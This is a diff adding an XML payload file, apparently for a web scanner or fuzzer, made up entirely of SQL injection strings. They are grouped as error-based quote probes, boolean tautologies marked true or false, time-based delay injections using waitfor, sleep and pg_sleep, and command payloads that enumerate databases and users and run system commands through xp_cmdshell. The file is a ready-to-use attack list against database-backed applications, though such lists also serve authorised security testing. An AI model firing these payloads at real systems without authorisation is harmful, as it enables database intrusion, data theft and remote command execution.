@@ -1,0 +1,96 @@
+<payloads>
+	<error-based>
+		'
+		"
+		;
+		)
+		|
+		+
+		%
+		*
+		';
+		\'
+		\"
+		"'
+		'"
+		%27
+		%22
+		'||'
+		&#34
+		&#39
+		|vol
+		||vol
+		'+"+'
+		'+''+'
+		'|'vol
+		"|"vol
+		%%2727
+		%25%27
+		" / %22
+		; / %3B
+		'+value
+		'+'value
+		va'+'lues
+		' ' VALUE
+		'||'VALUE
+		'+'somechars
+		somechars'+'
+		somechars'||'
+		'||'somechars
+		WF'SQL"Probe;A--B
+	</error-based>
+	<boolean-based>
+		<t>1 AND 5=5</t>
+		<f>1 AND 5=0</f>
+		<t>"' or 1=1 --</t>
+		<t>'" or 1=1 --</t>
+		<t>"' or 1=1 /*</t>
+		<t>'" or 1=1 /*</t>
+		<t>value AND 5=5</t>
+		<f>value AND 5=0</f>
+		<t>1 OR 5=5 OR 4=0</t>
+		<t>1 OR 5=0 OR 4=0</t>
+		<t>%27+—+OR+1%3D1-</t>
+		<t>value OR 5=5 OR 4=0</t>
+		<t>value OR 5=0 OR 4=0</t>
+		<f>/**/and/** /0=7659</f>
+		<t>/**/or/**/ 7659=7659</t>
+		<t>/**/and/**/ 7659=7659</t>
+		<t>%27%20—%20OR%201%3D1—</t>
+		<t>' or 'foobar'='foobar</t>
+		<t>' or 'foobar'='foobar' --</t>
+		<t>' or 'foobar'='foobar') --</t>
+		<f>' and 'barfoo'='foobar' --</f>
+		<f>' and 'barfoo'='foobar</f>
+		<f>value' OR 5=0 OR 's'='0</f>
+		<t>value' OR 5=5 OR 's'='0</t>
+		<f>value' AND 5=5 OR 's'='0</f>
+		<f>value' AND 5=0 OR 's'='0</f>
+		value' OR
+		' and 'foobar'='foobar
+		' and 'foobar'='foobar' --
+		' and 'foobar'='foobar') --
+	</boolean-based>
+	<time-based>
+		' waitfor delay '0:0:15' --
+		');waitfor delay '0:0:15' --
+		1,'0');waitfor delay '0:0:15' --
+		' waitfor time '0:0:15' --
+		');waitfor time '0:0:15' --
+		1,'0');waitfor time '0:0:15' --
+		' sleep(15) --
+		') sleep(15) --
+		1,'0') sleep(15) --
+		' pg_sleep(15) --
+		') pg_sleep(15) --
+		1,'0') pg_sleep(15) --
+	</time-based>
+	<commands>
+		' and 1 in (SELECT @@version) --
+		'' exec master..xp_cmdshell 'vol'--
+		'; select * from dbo.sysdatabases--
+		'; select @@ version,1,1,1--
+		'; select * from master..sysmessages--
+		'; select * from sys.dba_users--
+	</commands>
+</payloads>
